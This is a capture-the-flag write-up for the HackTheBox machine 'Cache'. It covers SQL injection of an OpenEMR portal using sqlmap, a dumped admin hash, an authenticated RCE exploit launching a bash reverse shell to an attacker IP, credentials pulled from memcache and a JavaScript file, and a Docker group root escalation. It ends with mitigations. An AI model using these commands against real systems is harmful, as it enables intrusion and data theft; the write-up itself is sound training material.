# Cache

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Webpage Enumeration

__Exploitation__

- SQL injection

- Authenticated remote code execution

__Priv Esc__

- Memcache dump

- Docker privilege escalation

***

This is my guide to the HackTheBox Linux machine _Cache_.

## User Flag

First, let's scan _Cache_ with nmap.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Fri Jul  3 16:39:51 2020 as: nmap -sC -sV -O -oA scan188 10.10.10.188
Nmap scan report for 10.10.10.188
Host is up (0.089s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/3%OT=22%CT=1%CU=34578%PV=Y%DS=2%DC=I%G=Y%TM=5EFFA5C1
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  3 16:40:17 2020 -- 1 IP address (1 host up) scanned in 26.34 seconds
```

Our scan indicates that only port 22 and port 80 are open. Our full port scan does not indicate that anymore ports are open. This tells us that this is most likely a web server.

Let's check out the website.

![](images/author-page.png)

Enumerating this site doesn't reveal a lot but the author page does indicate that we should add the domain name to our `/etc/hosts` file so that it resolves correctly.

```
sudo vi /etc/hosts
```

Additionally, the author mentions another project, the `HMS (Hospital Management System)`, that they've worked on. If this site resolves to `cache.htb` their HMS may resolve with a similar naming scheme. We'll add `hms.htb` to our `/etc/hosts` as well and see if we can successfully navigate to it.

![](images/hms-patient-login.png)

The Hospital Management System is available and we can see the patient portal login page. This screen also indicates that this is `OpenEMR` software, which, after a little research, looks to be vulnerable to a [SQL injection attack](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf). Page 8 has a lot of detail on the attack we will use.

The vulnerable URL is `http://hms.htb/portal/find_appt_popup_user.php?catid=1` and by adding a comment quotation mark to the `catid` parameter, we can add unsanitized input without authentication. Let's capture a request to this URL with Burp Suite and save it to a file called `portal.req`.

```
GET /portal/find_appt_popup_user.php?catid=1 HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: OpenEMR=d3jlli8duq6uv54u0m3aeqj3p4; PHPSESSID=tnhhjq3o1mlh11se0aab74nclv
Upgrade-Insecure-Requests: 1
DNT: 1
Cache-Control: max-age=0
```

Next we will use this request with `sqlmap` to enumerate the available databases.

```
$ sqlmap -r portal.req --dbs
[...]
available databases [2]:
[*] information_schema
[*] openemr
[...]
```

Two databases come back, but only one will contain useful information, the `openemr` database. Let's continue and see what tables are available.

```
$ sqlmap -r portal.req -D openemr --tables
[...]
| user_settings                         |
| users                                 |
| users_facility                        |
| users_secure                          |
[...]
```

Great, a few tables are available here, but the most promising one may be the `users_secure` which will potentially have some usernames and passwords. Let's dump it with `sqlmap`.

```
$ sqlmap -r portal.req -D openemr -T users_secure --dump
[...]
openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
[...]
```

We receive the `openemr_admin` credentials with a password hash. Let's crack it with `john`.

![](images/john.png)

The password for the `openemr_admin` user is `xxxxxx`. This will allow us to successfully log in, but from our earlier research, we found that there is an [authenticated remote code execution](https://www.exploit-db.com/exploits/45161) vulnerability.

We'll use this to open a reverse shell to our attack box. Let's start a `netcat` listener.

```
$ nc -lvnp 4444
```

We'll grab the python script from Exploit DB and run it with the URL, username, and password, along with our chosen command.

```
$ python rce_openemr.py http://hms.htb/ -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.179/4444 0>&1'
```

In this case, it'll call back to our box with a shell.

![](images/foothold.png)

Success, we've gained a foothold. Enumerating the `/etc/passwd` file reveals two users are available, `luffy` and `ash`. Enumerating doesn't reveal a lot, but listing the processes reveals that `memcache`, a cache for data for websites, is running, which may contain some sensitive information that we can use to escalate to another user.

```
$ ps -aux
```

A quick search reveals how to dump `memcache` and [retrieve the keys](https://lzone.de/blog/How-to%20Dump%20Keys%20from%20Memcache) which may prove useful.

To access the `memcache`, we'll use `telnet`. The port for this is 11211.

```
$ telnet localhost 11211
```

[This website](https://lzone.de/cheat-sheet/memcached) has a great cheat-sheet on `memcache`, but the command we want is `lru_crawler`, which will dump the available keys.

```
> lru_crawler metadump all
key=account exp=-1 la=1593896101 cas=31 fetch=no cls=1 size=75
key=file exp=-1 la=1593896101 cas=32 fetch=no cls=1 size=70
key=passwd exp=-1 la=1593896101 cas=33 fetch=no cls=1 size=74
key=user exp=-1 la=1593896101 cas=34 fetch=no cls=1 size=68
END
```

We'll grab the user key, to see if it is anything new.

```
> get user
VALUE user 0 5
luffy
END
```

Next, let's grab the password key.

```
> get passwd
VALUE passwd 0 9
0n3_p1ec3
END
```

With any luck, these new credentials can help us move laterally to another user. Let's give SSH a shot on our Kali box.

![](images/ssh-login.png)

Success, but it doesn't look like the user flag is within the home directory of the `luffy` user. Let's see what we can find to elevate to `ash`.

From the webpage, there was a login screen that we didn't have any credentials for. If we enumerate the webpages on the box with our remote session, there's a potential a cleartext password for that page is available.

After some searching we find a javascript file at the path `/var/www/cache.htb/public_html/jquery` that contains the function that checks whether the password works.

```
cat functionality.js
[...]
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
[...]
```

Let's see if user `ash` reused the password `H@v3_fun` allowing us to change users.

```
$ su ash
```

It worked. Let's grab the user flag.

![](images/user-flag.png)

## Root Flag

First, let's use `secure copy` to transfer the `lse.sh` script to the _Cache_ box. This a script for [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration), which allow us to quickly enumerate the ways we can escalate privileges.

```
scp lse.sh luffy@10.10.10.188:/tmp
```

Let's run it.

![](images/lse.png)

Docker is available and may offer a means of elevating our privileges to root, but the user `ash` is not  member of the group. Let's check `luffy`. Swapping over and checking shows that `luffy` is a member of the `docker` group.

GTFObins is a great repository for binaries that be exploited to elevate privileges, and fortunately for us, Docker is something [we can abuse](https://gtfobins.github.io/gtfobins/docker/).

All we have to do is run the following command found at the website.

```
$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
```

Success, a root shell has spawned, let's grab the root flag.

![](images/root-flag.png)

Rooted!

***

### Mitigation

- Critical vulnerabilities, like a SQL injection, need to patched as soon as possible. Even if no real information is stored in these databases, it may provide a means to further exploit the service and gain a foothold on the system, like on this machine.

- Password reuse should be avoided. Especially if the password is being stored locally in plaintext.

- Secure accounts that have special privileges with certain applications. These privileges can be abused to elevate privileges on that account, and should have special considerations.

### Final Thoughts

Great box, a lot of fun and definitely a bit challenging. Pretty straight forward, I learned a bit about `memcache` and Docker abuse. I will definitely look back on this box going forward.
